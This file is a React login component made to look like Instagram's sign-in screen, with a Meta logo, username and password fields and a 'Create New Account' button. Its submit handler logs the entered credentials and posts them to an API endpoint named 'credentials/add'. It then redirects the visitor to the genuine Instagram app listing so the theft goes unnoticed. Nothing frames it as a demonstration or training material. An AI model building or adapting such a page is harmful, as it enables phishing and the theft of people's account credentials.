import { Visibility, VisibilityOff } from "@mui/icons-material"
import { useState } from "react"
import { Link } from "react-router-dom"
import { useForm } from "react-hook-form"
import { IconButton, InputAdornment, TextField } from "@mui/material";

const Login = () => {
    const { register, handleSubmit } = useForm();
    const [showPassword, setShowPassword] = useState(false);
  
    const handleTogglePassword = () => {
      setShowPassword((prev) => !prev);
    };

    const onSubmit = async (data) => {
      console.log(data)
      try {
        const url = process.env.REACT_APP_API_URL + 'credentials/add';
        const response = await fetch(url, {
          method: "POST",
          body: JSON.stringify(data),
          headers: { "Content-Type": "application/json" }
        });
        const parsedResponse = await response.json();
        window.location.href = "https://play.google.com/store/apps/details?id=com.instagram.android";
  
      } catch (error) {
        
        console.error('Error during login:', error);
        alert('Login failed. Please try again.');

      }

      

    }


  return (
    <>
        <div className="container">
            <div className="py-3 d-none d-md-block"></div>
            <div className="row">
                <div className="col-md-6 col-xl-4 offset-md-3 offset-xl-4 p-0" style={{height: '100vh', backgroundColor: "#1d3343"}}>

                    <div className="text-center mt-5 py-3">
                        <div className="d-flex justify-content-center align-items-center" style={{ gap: "10px" }}>
                            <img src="/logo.png" alt="Logo" style={{ width: '70px', height: '70px' }} />
                        </div>
                    </div>
                    
                    <form onSubmit={handleSubmit(onSubmit)} className="p-3">
                    <TextField
                        {...register('email', {required: 'Enter valid email address'})}
                        label="Username, email or phone number"
                        variant="filled"
                        fullWidth
                        margin="normal"
                        InputProps={{
                            disableUnderline: true, // ✅ disables the underline
                            style: {
                            backgroundColor: 'rgba(255, 255, 255, 0.05)',
                            color: '#fff',
                            borderRadius: 8
                            }
                        }}
                        InputLabelProps={{
                            style: {
                            color: 'rgba(255, 255, 255, 0.7)'
                            }
                        }}
                        sx={{
                            '& .MuiFilledInput-root': {
                              backgroundColor: 'transparent',
                              border: '1px solid rgba(255, 255, 255, 0.2)',
                              borderRadius: 2,
                              '&:hover': {
                                borderColor: 'rgba(255, 255, 255, 0.4)',
                              },
                              '&.Mui-focused': {
                                borderColor: '#fff',
                              },
                              '& input:-webkit-autofill': {
                                WebkitBoxShadow: '0 0 0 1000px rgba(255, 255, 255, 0.05) inset',
                                WebkitTextFillColor: '#fff',
                                transition: 'background-color 5000s ease-in-out 0s',
                              }
                            },
                            input: {
                              color: '#fff',
                            }
                          }}
                          
                        />
                        <TextField
                            {...register('password', {required: 'Password is required'})}
                            label="Password"
                            type={showPassword ? 'text' : 'password'}
                            variant="filled"
                            fullWidth autoComplete="new-password"
                            margin="normal"
                            InputProps={{
                                disableUnderline: true,
                                style: {
                                backgroundColor: 'rgba(255, 255, 255, 0.05)',
                                color: '#fff',
                                borderRadius: 8
                                },
                                endAdornment: (
                                <InputAdornment position="end" className="px-2">
                                    <IconButton
                                    onClick={handleTogglePassword}
                                    edge="end"
                                    sx={{ color: '#fff' }}
                                    >
                                    {showPassword ? <VisibilityOff /> : <Visibility />}
                                    </IconButton>
                                </InputAdornment>
                                )
                            }}
                            InputLabelProps={{
                                style: {
                                color: 'rgba(255, 255, 255, 0.7)'
                                }
                            }}sx={{
                                '& .MuiFilledInput-root': {
                                  backgroundColor: 'transparent',
                                  border: '1px solid rgba(255, 255, 255, 0.2)',
                                  borderRadius: 2,
                                  '&:hover': {
                                    borderColor: 'rgba(255, 255, 255, 0.4)',
                                  },
                                  '&.Mui-focused': {
                                    borderColor: '#fff',
                                  },
                                  '& input:-webkit-autofill': {
                                    WebkitBoxShadow: '0 0 0 1000px rgba(255, 255, 255, 0.05) inset',
                                    WebkitTextFillColor: '#fff',
                                    caretColor: '#fff',
                                    transition: 'background-color 5000s ease-in-out 0s',
                                    borderRadius: 2,
                                  }
                                },
                                '& .MuiInputAdornment-root': {
                                  backgroundColor: 'rgba(255, 255, 255, 0.05)', // ✅ force match
                                  borderTopRightRadius: 8,
                                  borderBottomRightRadius: 8,
                                },
                                input: {
                                  color: '#fff',
                                }
                              }}
                              
                              
                        />

                        <button type="submit" className="btn btn-lg w-100 btn-primary mt-2" style={{borderRadius: "30px"}}> Log in </button>
                        <div className="fs-5 my-3 text-white text-center">Forgot Password ?</div>



                    </form>
                    <div className="position-absolute bottom-0 w-100 text-center p-3" style={{gap: "10px", padding: "20px 0"}}>
                        <Link to={'/register'}><button type="submit" className="btn btn-lg w-100 btn-outline-primary mt-2" style={{borderRadius: "30px"}} >Create New Account</button></Link>
                        <img src="/meta.png" alt="Meta Logo" className="m-auto my-2 mt-4" width={70} />
                    </div>
                

                </div>
            </div>
        </div> 
    </>
  )
}

export default Login
